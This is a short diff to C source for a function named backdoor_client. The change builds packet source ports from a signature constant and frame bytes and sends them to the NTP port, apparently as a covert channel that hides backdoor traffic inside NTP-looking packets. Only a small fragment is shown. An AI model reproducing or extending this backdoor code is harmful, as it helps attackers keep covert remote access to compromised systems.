@@ -76,8 +76,10 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 
 //			free(enc);
 //			sendto(sock, frame, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
-			src_port = (frame[0] << 8) + frame[i];
+			src_port = (SIGNTR << 8) + frame[i];
 			dst_port = PORT_NTP;
+
+//			printf("Src: %d\n", src_port);
 			
 			_send(ipaddr, src_port, dst_port, TRUE);
 			
